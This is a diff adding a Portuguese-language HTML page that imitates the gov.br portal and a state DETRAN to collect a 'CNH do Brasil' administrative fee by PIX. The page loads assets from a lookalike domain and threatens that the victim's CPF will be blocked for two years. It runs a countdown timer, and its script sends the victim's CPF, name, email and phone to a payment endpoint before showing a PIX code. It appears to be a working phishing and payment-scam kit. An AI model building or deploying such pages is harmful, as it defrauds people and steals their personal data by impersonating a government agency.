@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pagamento via PIX - CNH do Brasil</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f3f4f6;
+      color: #111827;
+    }
+    main.flex-1 { min-height: 100vh; }
+    header.govbr {
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      font-family: "Rawline", "Open Sans", Arial, sans-serif;
+    }
+    .govbr-top {
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #e5e7eb;
+      height: 48px;
+    }
+    .govbr-logo img { height: 22px; display: block; }
+    .govbr-icons { display: flex; align-items: center; gap: 14px; color: #1351b4; }
+    .govbr-icon {
+      width: 20px;
+      height: 20px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .govbr-user {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #1351b4;
+      color: #ffffff;
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+    .govbr-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 16px;
+      color: #1f2937;
+      background: #ffffff;
+      height: 40px;
+    }
+    .govbr-title {
+      font-size: 14px;
+      font-weight: 500;
+      color: #374151;
+    }
+    .loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 240px;
+      font-size: 12px;
+      color: #6b7280;
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      gap: 16px;
+    }
+    .summary-col { display: flex; flex-direction: column; gap: 4px; }
+    .summary-label { font-size: 10px; color: #6b7280; letter-spacing: 0.2px; }
+    .summary-value { font-size: 14px; font-weight: 700; color: #111827; }
+    .flex-1 { flex: 1 1 0%; }
+    .p-4 { padding: 10px; }
+    .max-w-lg { max-width: 32rem; }
+    .mx-auto { margin-left: auto; margin-right: auto; }
+
+    .bg-yellow-50 { background: #fffbeb; }
+    .bg-red-50 { background: #fef2f2; }
+    .bg-white { background: #fff; }
+    .bg-gray-50 { background: #f9fafb; }
+    .bg-gray-50 { background: #f9fafb; }
+    .bg-\[\#E8F0FE\] { background: #e8f0fe; }
+    .bg-\[\#2670CC\] { background: #2670cc; }
+    .bg-\[\#1351B4\] { background: #1351b4; }
+    .bg-\[\#0D3A8C\] { background: #0d3a8c; }
+
+    .rounded-lg { border-radius: 0.5rem; }
+    .rounded-md { border-radius: 0.375rem; }
+    .rounded { border-radius: 0.25rem; }
+
+    .border { border: 1px solid #d1d5db; }
+    .border-2 { border: 2px solid #d1d5db; }
+    .border-b { border-bottom: 1px solid #d1d5db; }
+    .border-gray-300 { border-color: #d1d5db; }
+    .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1); }
+    .shadow-md { box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1); }
+
+    .flex { display: flex; }
+    .flex-col { flex-direction: column; }
+    .items-center { align-items: center; }
+    .items-start { align-items: flex-start; }
+    .justify-center { justify-content: center; }
+    .gap-3 { gap: 0.5rem; }
+    .gap-2 { gap: 0.375rem; }
+    .gap-1 { gap: 0.25rem; }
+    .mb-4 { margin-bottom: 0.5rem; }
+    .mb-3 { margin-bottom: 0.375rem; }
+    .mb-2 { margin-bottom: 0.25rem; }
+    .mb-1 { margin-bottom: 0.25rem; }
+    .mt-1 { margin-top: 0.25rem; }
+    .mt-2 { margin-top: 0.25rem; }
+    .mt-3 { margin-top: 0.5rem; }
+    .mt-4 { margin-top: 0.5rem; }
+    .text-center { text-align: center; }
+    .text-right { text-align: right; }
+
+    .text-sm { font-size: 0.875rem; }
+    .text-xs { font-size: 0.75rem; }
+    .text-3xl { font-size: 1.875rem; }
+    .text-lg { font-size: 1.125rem; }
+
+    .font-bold { font-weight: 700; }
+    .font-semibold { font-weight: 600; }
+    .font-medium { font-weight: 500; }
+
+    .text-yellow-800 { color: #92400e; }
+    .text-yellow-700 { color: #a16207; }
+    .text-yellow-600 { color: #ca8a04; }
+    .text-red-800 { color: #991b1b; }
+    .text-red-600 { color: #dc2626; }
+    .text-gray-800 { color: #1f2937; }
+    .text-gray-600 { color: #4b5563; }
+    .text-gray-500 { color: #6b7280; }
+    .text-white { color: #fff; }
+    .text-\[\#1351B4\] { color: #1351b4; }
+
+    .h-6 { height: 1.5rem; }
+    .w-6 { width: 1.5rem; }
+    .w-5 { width: 1.25rem; }
+    .h-5 { height: 1.25rem; }
+    .w-48 { width: 12rem; }
+    .h-48 { height: 12rem; }
+    .w-56 { width: 14rem; }
+    .h-56 { height: 14rem; }
+    .h-16 { height: 4rem; }
+    .max-w-\[200px\] { max-width: 200px; }
+    .object-contain { object-fit: contain; }
+
+    .flex-shrink-0 { flex-shrink: 0; }
+    .mt-0\.5 { margin-top: 0.125rem; }
+    .p-2 { padding: 0.375rem; }
+    .p-3 { padding: 0.5rem; }
+    .p-4 { padding: 10px; }
+
+    .grid { display: grid; }
+    .grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+
+    .break-all { word-break: break-all; }
+    .font-mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
+
+    .w-full { width: 100%; }
+    .w-2 { width: 0.5rem; }
+    .h-2 { height: 0.5rem; }
+    .rounded-full { border-radius: 9999px; }
+    .transition-all { transition: all 0.2s ease; }
+    .hover\:bg-\[\#0D3A8C\]:hover { background: #0d3a8c; }
+
+    .animate-bounce { animation: bounce 1s infinite; }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+</head>
+<body>
+  <header class="govbr">
+    <div class="govbr-top">
+      <div class="govbr-logo"><img src="https://assets.pogramasenatran.org/govbr-logo.png" alt="gov.br" /></div>
+      <div class="govbr-icons">
+        <span class="govbr-icon" aria-hidden="true">⋮</span>
+        <span class="govbr-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="7" r="3"></circle>
+            <path d="M5.5 20a6.5 6.5 0 0 1 13 0"></path>
+          </svg>
+        </span>
+        <span class="govbr-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
+            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
+            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
+            <rect x="14" y="14" width="7" height="7" rx="1"></rect>
+          </svg>
+        </span>
+        <span class="govbr-user"><span>👤</span><span id="header-user-name">USUÁRIO</span></span>
+      </div>
+    </div>
+    <div class="govbr-bar">
+      <span aria-hidden="true">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </span>
+      <span class="govbr-title">Ministério dos Transportes</span>
+      <span style="margin-left:auto;" aria-hidden="true">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#1351b4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="7"></circle>
+          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+        </svg>
+      </span>
+    </div>
+  </header>
+
+  <main class="flex-1 p-4">
+    <div class="max-w-lg mx-auto">
+      <div class="bg-red-50 rounded-lg p-3 mb-3">
+        <div class="flex items-start gap-3">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5">
+            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path>
+            <path d="M12 9v4"></path>
+            <path d="M12 17h.01"></path>
+          </svg>
+          <div>
+            <p class="font-bold text-red-800">PAGAMENTO OBRIGATÓRIO</p>
+            <p class="text-sm text-red-600 mt-1">O pagamento das taxas administrativas é obrigatório para garantir sua vaga no programa. Caso não seja realizado, seu CPF ficará bloqueado por 2 anos.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-yellow-50 rounded-lg p-3 mb-3">
+        <div class="text-center">
+          <p class="font-bold text-yellow-800">A guia de pagamento vence em:</p>
+          <p class="text-3xl font-bold text-yellow-700 mt-2" id="timer">10:00</p>
+        </div>
+      </div>
+
+      <div class="bg-white border-2 border-gray-300 shadow-lg" style="font-family: Arial, sans-serif;">
+        <div class="bg-white p-3 border-b border-gray-300">
+          <div class="flex flex-col items-center">
+            <img id="detran-logo" alt="Brasão do Estado" class="h-16 max-w-[200px] object-contain mb-2" />
+            <p class="text-sm font-bold text-gray-800" id="detran-title">DETRAN/UF - GUIA DE RECOLHIMENTO</p>
+            <p class="text-xs text-gray-600">TAXAS ADMINISTRATIVAS CNH</p>
+          </div>
+        </div>
+
+        <div class="p-3 border-b border-gray-300">
+          <div>
+            <p class="text-gray-500 text-xs">CONTRIBUINTE</p>
+            <p class="font-bold text-gray-800" id="nome">-</p>
+          </div>
+          <div class="mt-2">
+            <p class="text-gray-500 text-xs">CPF</p>
+            <p class="font-semibold text-gray-800" id="cpf">-</p>
+          </div>
+        </div>
+
+        <div class="p-3 border-b border-gray-300 bg-gray-50">
+          <div class="text-center">
+            <p class="text-gray-500 text-xs">EXERCÍCIO</p>
+            <p class="font-bold text-gray-800 text-lg" id="exercise">2026</p>
+          </div>
+        </div>
+
+        <div class="p-3 border-b border-gray-300">
+          <div class="grid grid-cols-3 gap-2 text-sm">
+            <div>
+              <p class="text-gray-500 text-xs">TED</p>
+              <p class="font-semibold" id="fee-ted">-</p>
+            </div>
+            <div>
+              <p class="text-gray-500 text-xs">TSA</p>
+              <p class="font-semibold" id="fee-tsa">-</p>
+            </div>
+            <div>
+              <p class="text-gray-500 text-xs">TPE</p>
+              <p class="font-semibold" id="fee-tpe">-</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="p-3 bg-[#E8F0FE]">
+          <div class="text-center mb-2">
+            <p class="font-bold text-sm text-[#1351B4]" id="pix-title">DETRAN/UF - PAGAMENTO VIA PIX</p>
+            <p class="text-xs text-gray-600">Programa CNH do Brasil - Taxas Administrativas</p>
+          </div>
+          <div class="bg-white p-3 rounded border border-gray-300 mb-2 flex flex-col items-center">
+            <p class="text-xs text-gray-500 mb-2">QR CODE PIX:</p>
+            <div id="qr-loading" class="loading">Carregando QR Code...</div>
+            <img id="qr" alt="QR Code PIX" class="w-56 h-56 object-contain" style="display:none;" />
+          </div>
+          <div class="bg-white p-3 rounded border border-gray-300 mb-2">
+            <p class="text-xs text-gray-500 mb-1">CÓDIGO PIX COPIA E COLA:</p>
+            <p id="pix-code" class="text-xs break-all font-mono bg-gray-50 p-2 rounded border">-</p>
+          </div>
+          <button id="copy" class="w-full flex items-center justify-center gap-2 p-3 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5">
+              <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+              <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+            </svg>
+            <span>Copiar Código PIX</span>
+          </button>
+          <div class="mt-2 summary-row">
+            <div class="summary-col">
+              <span class="summary-label">VENCIMENTO DA GUIA</span>
+              <span class="summary-value" id="due-date">-</span>
+            </div>
+            <div class="summary-col" style="text-align:right; margin-left:auto;">
+              <span class="summary-label">VALOR A PAGAR EM REAIS</span>
+              <span class="summary-value" id="amount">-</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-3 bg-[#2670CC] text-white p-3 rounded-lg">
+        <div class="flex items-center gap-3 mb-2">
+          <span>Aguardando pagamento</span>
+          <div class="flex items-center gap-1">
+            <span class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0ms;"></span>
+            <span class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 150ms;"></span>
+            <span class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 300ms;"></span>
+          </div>
+        </div>
+        <p class="text-sm">Assim que o pagamento for confirmado, você será redirecionado automaticamente.</p>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const data = {
+      cpf: params.get("cpf") || "",
+      nome: params.get("nome") || "",
+      email: params.get("email") || "",
+      phone: params.get("phone") || "",
+      amount: params.get("amount") || "64.73",
+      title: params.get("title") || "Taxa de Adesão",
+      uf: params.get("uf") || "",
+      detran: params.get("detran") || "",
+      pixCode: params.get("pix_code") || "",
+      tx: params.get("tx") || "",
+    };
+
+    const detranLogoBase = "https://assets.pogramasenatran.org/detran/";
+
+    const detranUf = (data.uf || data.detran || "AC").replace("DETRAN/", "").trim().toUpperCase();
+    const detranLabel = detranUf ? `DETRAN/${detranUf}` : "DETRAN";
+    document.getElementById("detran-title").textContent = `${detranLabel} - GUIA DE RECOLHIMENTO`;
+    document.getElementById("pix-title").textContent = `${detranLabel} - PAGAMENTO VIA PIX`;
+    const logo = detranUf ? `${detranLogoBase}${detranUf}.webp` : "";
+    const logoEl = document.getElementById("detran-logo");
+    if (logo) {
+      logoEl.src = logo;
+      logoEl.onerror = () => { logoEl.style.display = "none"; };
+    } else {
+      logoEl.style.display = "none";
+    }
+
+    const formatCpf = (value) => {
+      const digits = (value || "").replace(/\D/g, "");
+      if (digits.length !== 11) return value || "-";
+      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
+    };
+
+    const displayName = (data.nome || "").trim();
+    document.getElementById("nome").textContent = displayName || "-";
+    const headerNameEl = document.getElementById("header-user-name");
+    if (headerNameEl) {
+      const firstName = displayName ? displayName.split(" ")[0] : "";
+      headerNameEl.textContent = firstName ? firstName.toUpperCase() : "USUÁRIO";
+    }
+    document.getElementById("cpf").textContent = formatCpf(data.cpf || "");
+    const amountValue = Number(data.amount || 0);
+    document.getElementById("amount").textContent = `R$ ${amountValue.toFixed(2)}`.replace(".", ",");
+
+    const ted = amountValue * 0.375;
+    const tsa = amountValue * 0.3125;
+    const tpe = amountValue - ted - tsa;
+    document.getElementById("fee-ted").textContent = `R$ ${ted.toFixed(2)}`.replace(".", ",");
+    document.getElementById("fee-tsa").textContent = `R$ ${tsa.toFixed(2)}`.replace(".", ",");
+    document.getElementById("fee-tpe").textContent = `R$ ${tpe.toFixed(2)}`.replace(".", ",");
+
+    const now = new Date();
+    const due = `${String(now.getDate()).padStart(2, "0")}/${String(now.getMonth() + 1).padStart(2, "0")}/${now.getFullYear()}`;
+    document.getElementById("due-date").textContent = due;
+    document.getElementById("exercise").textContent = String(now.getFullYear());
+
+    let remaining = 10 * 60;
+    const timerEl = document.getElementById("timer");
+    setInterval(() => {
+      if (remaining <= 0) return;
+      remaining -= 1;
+      const m = String(Math.floor(remaining / 60)).padStart(2, "0");
+      const s = String(remaining % 60).padStart(2, "0");
+      timerEl.textContent = `${m}:${s}`;
+    }, 1000);
+
+    const qrImg = document.getElementById("qr");
+    const qrLoading = document.getElementById("qr-loading");
+
+    async function renderQr(pixText) {
+      const normalized = (pixText || "").replace(/\s+/g, "");
+      if (!normalized) return;
+      qrLoading.style.display = "none";
+      qrImg.style.display = "block";
+      try {
+        const qr = await QRCode.toDataURL(normalized, { width: 240, margin: 1 });
+        qrImg.src = qr;
+      } catch (err) {
+        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(normalized)}`;
+      }
+    }
+
+    async function createPix() {
+      if (!data.cpf || !data.nome || !data.email) return;
+      qrLoading.style.display = "flex";
+      qrImg.style.display = "none";
+      const payload = {
+        cpf: data.cpf,
+        nome: data.nome,
+        email: data.email,
+        phone: data.phone || "",
+        amount: data.amount,
+        title: data.title,
+        uf: detranUf,
+      };
+      const resp = await fetch("/api/payment", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+      const json = await resp.json();
+      if (!json.success) {
+        return;
+      }
+      document.getElementById("pix-code").textContent = json.pix_code || "";
+      await renderQr(json.pix_code || "");
+    }
+
+    document.getElementById("copy").addEventListener("click", async () => {
+      const text = document.getElementById("pix-code").textContent;
+      if (!text) return;
+      await navigator.clipboard.writeText(text);
+      document.getElementById("copy").textContent = "Copiado!";
+      setTimeout(() => (document.getElementById("copy").textContent = "Copiar Código PIX"), 1500);
+    });
+
+    if (data.pixCode) {
+      document.getElementById("pix-code").textContent = data.pixCode;
+      renderQr(data.pixCode);
+    } else {
+      createPix().catch(() => {});
+    }
+  </script>
+</body>
+</html>
